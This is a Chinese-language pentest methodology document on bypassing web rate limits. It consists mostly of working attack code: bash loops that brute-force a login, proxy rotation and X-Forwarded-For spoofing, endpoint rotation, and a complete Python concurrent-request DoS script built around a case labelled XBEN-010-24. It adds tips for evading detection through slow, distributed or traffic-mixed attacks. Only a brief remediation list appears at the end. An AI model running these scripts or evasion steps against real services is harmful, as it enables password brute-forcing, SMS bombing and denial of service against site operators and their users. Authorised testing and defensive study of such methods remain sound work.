# 速率限制绕过方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的速率限制检测和绕过方法流程。

## 1.2 适用范围

本文档适用于所有实施了速率限制机制的 Web 应用和 API 接口。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

速率限制绕过是指攻击者通过技术手段绕过系统对请求频率的限制，从而进行暴力破解、资源滥用等攻击。

**本质问题**：
- 速率限制实现缺陷
- 缺少多维度限制
- 限制阈值过高

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-307 | 认证机制缺陷 |
| CWE-770 | 无速率限制的资源分配 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 登录接口 | 用户登录 | 暴力破解密码 |
| 短信发送 | 验证码发送 | 短信轰炸 |
| 密码重置 | 密码恢复 | 枚举用户账户 |
| API 接口 | 数据查询 | 数据爬取 |
| 注册接口 | 用户注册 | 批量注册 |

## 2.3 漏洞发现方法

### 2.3.1 速率限制检测

```bash
# 快速发送多个请求
for i in {1..100}; do
    curl -X POST https://target.com/login \
        -d "username=admin&password=test$i" &
done

# 检查响应：
# - 429 Too Many Requests 表示有限制
# - 请求被延迟表示有限制
# - 请求成功表示可能无限制
```

### 2.3.2 限制维度分析

```bash
# 分析限制基于什么：
# - IP 地址
# - 用户账户
# - Session ID
# - API Key
# - 设备指纹
```

### 2.3.3 阈值测试

```bash
# 测试触发限制的请求数量
for i in {1..200}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        https://target.com/api/test)
    echo "$i: $response"
    [ "$response" = "429" ] && break
done
```

## 2.4 漏洞利用方法

### 2.4.1 IP 轮换绕过

```bash
# 使用代理池
for proxy in proxy_list.txt; do
    curl -x $proxy https://target.com/login \
        -d "username=admin&password=test"
done
```

### 2.4.2 请求头变换

```bash
# 变换 User-Agent
curl -H "User-Agent: Mozilla/5.0 ..." \
    https://target.com/api/test

# 变换 X-Forwarded-For
curl -H "X-Forwarded-For: 1.2.3.4" \
    https://target.com/api/test
```

### 2.4.3 分布式攻击

```bash
# 使用多个设备/IP 同时发起请求
# 每个源低于限制阈值
```

## 2.5 漏洞利用绕过方法

### 2.5.1 慢速攻击

```bash
# 在请求间添加延迟
for i in {1..100}; do
    curl https://target.com/login -d "..."
    sleep 2  # 等待 2 秒
done
```

### 2.5.2 参数变换

```bash
# 改变请求格式
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data

# 不同格式可能被不同计数
```

### 2.5.3 端点轮换

```bash
# 如果有多个相似端点
/api/v1/login
/api/v2/login
/login
/auth/login

# 轮流使用不同端点
```

### 2.5.4 资源耗尽 DoS 攻击

**场景描述**：当应用每个请求触发高资源消耗操作（如 subprocess 调用、数据库查询、文件操作）时，可通过并发请求耗尽系统资源。

**XBEN-010-24 实战案例**：Flask 应用每个 POST 请求触发 PhantomJS 子进程（5 秒超时，150MB RAM）

**利用步骤**：

```bash
# 步骤 1：识别资源消耗点
# 分析应用每个请求触发的后台操作
# - subprocess 调用
# - 数据库查询
# - 文件 I/O
# - 外部 API 调用

# 步骤 2：测试并发处理
# 发送 100 个并发请求，观察执行时间
python3 -c "
import requests, concurrent.futures, time

def send_request(i):
    r = requests.post('http://target.com/page', data={'name': f'test{i}'})
    return r.status_code

start = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    results = list(executor.map(send_request, range(100)))
end = time.time()

print(f'100 并发请求耗时：{end-start:.2f}秒')
print(f'成功：{results.count(200)}, 失败：{results.count(429)}')
"

# 步骤 3：计算资源放大倍数
# 如果 100 个并发请求在 0.12 秒内被接受
# 每个请求触发 5 秒 PhantomJS 进程
# 资源放大倍数 = 100 * 5秒 / 0.12秒 = 4166x
```

**资源消耗计算**：

| 资源类型 | 单请求消耗 | 100 并发消耗 | 系统影响 |
|---------|-----------|------------|---------|
| RAM | 150MB/进程 | 15GB | 内存耗尽 |
| CPU | 100% * 5 秒 | 500 秒 CPU 时间 | CPU 饱和 |
| 进程数 | 1 个子进程 | 100 个子进程 | 进程表耗尽 |
| 文件描述符 | 3 个 FD | 300 个 FD | FD 耗尽 |

**自动化 DoS 脚本**：

```python
#!/usr/bin/env python3
"""
资源耗尽 DoS 攻击脚本
目标：每个请求触发高资源消耗操作的应用
"""

import requests
import concurrent.futures
import time

TARGET_URL = 'http://target.com/page'
CONCURRENT_WORKERS = 100
REQUESTS_PER_ATTACK = 100

def send_request(i):
    """发送单个请求"""
    try:
        response = requests.post(
            TARGET_URL,
            data={'name': f'dos_payload_{i}'},
            timeout=10
        )
        return {
            'status': response.status_code,
            'time': response.elapsed.total_seconds()
        }
    except Exception as e:
        return {'status': 'error', 'error': str(e)}

def run_dos_attack():
    """执行 DoS 攻击"""
    print(f"[*] 发起 {REQUESTS_PER_ATTACK} 个并发请求...")
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
        futures = [executor.submit(send_request, i) for i in range(REQUESTS_PER_ATTACK)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    end_time = time.time()
    total_time = end_time - start_time
    
    # 统计结果
    success = sum(1 for r in results if r.get('status') == 200)
    rate_limited = sum(1 for r in results if r.get('status') == 429)
    errors = sum(1 for r in results if r.get('status') == 'error')
    
    print(f"\n[+] 攻击完成:")
    print(f"    总耗时：{total_time:.2f}秒")
    print(f"    成功请求：{success}")
    print(f"    速率限制：{rate_limited}")
    print(f"    错误：{errors}")
    
    # 计算资源放大
    if success > 0 and total_time < 5:
        amplification = (success * 5) / total_time  # 假设每个请求 5 秒后台操作
        print(f"\n[!] 资源放大倍数：{amplification:.1f}x")
        print(f"    服务器需要处理 {success * 5:.1f} 秒的后台操作")
        print(f"    实际耗时仅 {total_time:.2f}秒")
    
    return results

if __name__ == '__main__':
    run_dos_attack()
```

**DoS 攻击效果验证**：

```bash
# 验证服务器资源耗尽
# 方法 1：监控响应时间
for i in {1..200}; do
    start=$(date +%s.%N)
    curl -s http://target.com/page -d "name=test$i" > /dev/null
    end=$(date +%s.%N)
    echo "请求 $i: $(echo "$end - $start" | bc)秒"
done

# 方法 2：检查服务是否不可用
curl -m 5 http://target.com/page
# 如果超时或连接拒绝，说明 DoS 成功

# 方法 3：检查子进程数量
ps aux | grep phantomjs | wc -l
# 如果数量激增，说明资源被耗尽
```

**防御绕过技术**：

```bash
# 1. 低频持续攻击
# 每 10 秒发送 1 个请求，持续数小时
# 每个请求触发 5 秒后台操作
# 累积消耗资源但不触发速率限制

# 2. 分布式资源耗尽
# 使用多个 IP 源，每个源发送少量请求
# 总请求数足以耗尽资源但每个源低于限制

# 3. 混合正常流量
# 90% 正常请求 + 10% 资源消耗请求
# 降低被检测概率
```

---

# 第三部分：附录

## 3.1 速率限制测试检查清单

```
□ 检测速率限制存在性
□ 测试限制阈值
□ 分析限制维度
□ 测试 IP 轮换绕过
□ 测试请求头变换
□ 测试慢速攻击
□ 测试分布式攻击
```

## 3.2 修复建议

1. **多维度限制** - 结合 IP、用户、设备等多维度
2. **渐进式限制** - 随失败次数增加限制力度
3. **分布式检测** - 检测分布式攻击模式
4. **人机验证** - 触发限制时要求验证码

---

**参考资源**：
- [OWASP Cheat Sheet: Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger - Rate Limiting](https://portswigger.net/web-security/rate-limiting)
